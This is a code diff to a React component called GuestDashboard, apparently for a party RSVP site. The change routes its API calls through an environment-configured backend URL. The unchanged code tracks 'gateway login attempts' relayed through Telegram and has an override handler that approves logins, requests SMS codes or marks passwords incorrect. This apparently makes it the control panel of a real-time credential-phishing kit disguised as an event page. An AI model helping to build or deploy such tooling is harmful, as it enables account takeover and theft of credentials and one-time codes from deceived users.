@@ -9,6 +9,9 @@ interface GuestDashboardProps {
   logAction: (type: "PAGE_VIEW" | "PROVIDER_SELECT" | "GATEWAY_LOGIN_ATTEMPT" | "LOGIN_SUCCESS" | "RSVP_SUBMITTED", details: string) => void;
 }
 
+// 💡 Capture the environment variable injected by Render, fallback to an empty string for local proxy matching
+const API_BASE_URL = import.meta.env.VITE_API_URL || "";
+
 export default function GuestDashboard({ guestEmail, onLogout, logAction }: GuestDashboardProps) {
   // State from API backend
   const [rsvps, setRsvps] = useState<RSVP[]>([]);
@@ -42,13 +45,14 @@ export default function GuestDashboard({ guestEmail, onLogout, logAction }: Gues
   // Fetch all backend data
   const fetchAllData = async () => {
     try {
+      // 💡 Appended ${API_BASE_URL} to safely route production traffic out to Render
       const [rRes, gRes, sRes, lRes, tgConfigRes, tgAttemptsRes] = await Promise.all([
-        fetch("/api/rsvps"),
-        fetch("/api/guestbook"),
-        fetch("/api/playlist"),
-        fetch("/api/logs"),
-        fetch("/api/telegram/config"),
-        fetch("/api/telegram/attempts")
+        fetch(`${API_BASE_URL}/api/rsvps`),
+        fetch(`${API_BASE_URL}/api/guestbook`),
+        fetch(`${API_BASE_URL}/api/playlist`),
+        fetch(`${API_BASE_URL}/api/logs`),
+        fetch(`${API_BASE_URL}/api/telegram/config`),
+        fetch(`${API_BASE_URL}/api/telegram/attempts`)
       ]);
       
       if (rRes.ok) setRsvps(await rRes.json());
@@ -67,12 +71,10 @@ export default function GuestDashboard({ guestEmail, onLogout, logAction }: Gues
     }
   };
 
-  // Real-time Telegram connection is now managed via secure server environment variables (.env)
-
   // Trigger manual override bypass for ongoing login attempts
   const handleTriggerOverride = async (attemptId: string, actionStatus: "approved" | "request_sms" | "incorrect_password" | "denied") => {
     try {
-      const res = await fetch("/api/telegram/local_override", {
+      const res = await fetch(`${API_BASE_URL}/api/telegram/local_override`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ id: attemptId, status: actionStatus })
@@ -98,7 +100,7 @@ export default function GuestDashboard({ guestEmail, onLogout, logAction }: Gues
     if (!rsvpName) return;
 
     try {
-      const response = await fetch("/api/rsvps", {
+      const response = await fetch(`${API_BASE_URL}/api/rsvps`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -126,7 +128,7 @@ export default function GuestDashboard({ guestEmail, onLogout, logAction }: Gues
     if (!msgAuthor || !msgText) return;
 
     try {
-      const response = await fetch("/api/guestbook", {
+      const response = await fetch(`${API_BASE_URL}/api/guestbook`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ author: msgAuthor, message: msgText })
@@ -149,7 +151,7 @@ export default function GuestDashboard({ guestEmail, onLogout, logAction }: Gues
     if (!songTitle || !songArtist) return;
 
     try {
-      const response = await fetch("/api/playlist", {
+      const response = await fetch(`${API_BASE_URL}/api/playlist`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ title: songTitle, artist: songArtist, requestedBy: rsvpName || "VIP Guest" })
@@ -168,7 +170,7 @@ export default function GuestDashboard({ guestEmail, onLogout, logAction }: Gues
   // Handle Song Upvote
   const handleUpvote = async (songId: string) => {
     try {
-      const response = await fetch("/api/playlist/upvote", {
+      const response = await fetch(`${API_BASE_URL}/api/playlist/upvote`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ id: songId })
@@ -439,7 +441,6 @@ export default function GuestDashboard({ guestEmail, onLogout, logAction }: Gues
               </div>
             </div>
           </section>
-
 
           {/* GUESTBOOK CARD */}
           <section className="glass-card rounded-3xl p-6 sm:p-8" id="dashboard-guestbook-section">
